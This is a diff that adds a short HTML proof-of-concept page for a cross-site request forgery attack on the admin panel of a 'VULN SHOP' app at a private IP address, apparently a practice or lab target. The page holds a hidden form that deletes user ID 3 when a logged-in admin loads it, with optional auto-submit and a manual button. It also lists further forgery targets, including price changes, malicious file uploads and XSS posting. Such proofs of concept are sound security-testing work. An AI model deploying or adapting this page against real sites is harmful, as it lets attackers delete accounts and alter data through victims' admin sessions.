@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - User Deletion</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>This page demonstrates CSRF vulnerability in VULN SHOP admin panel.</p>
+    <p>When a logged-in admin visits this page, user ID 3 will be deleted automatically.</p>
+
+    <!-- Auto-submit form for user deletion -->
+    <form id="csrf-form" action="http://10.210.136.53:3000/admin/users/3/delete" method="POST">
+        <input type="hidden" name="confirm" value="true" />
+    </form>
+
+    <script>
+        // Uncomment to auto-submit
+        // document.getElementById('csrf-form').submit();
+    </script>
+
+    <h2>Manual Test Button</h2>
+    <button onclick="document.getElementById('csrf-form').submit()">Delete User ID 3</button>
+
+    <hr>
+    <h2>Other CSRF Targets</h2>
+    <ul>
+        <li>POST /admin/products/{id} - Modify product prices</li>
+        <li>POST /admin/users/{id}/delete - Delete any user</li>
+        <li>POST /profile/upload - Upload malicious files</li>
+        <li>POST /board - Post XSS payloads</li>
+    </ul>
+</body>
+</html>
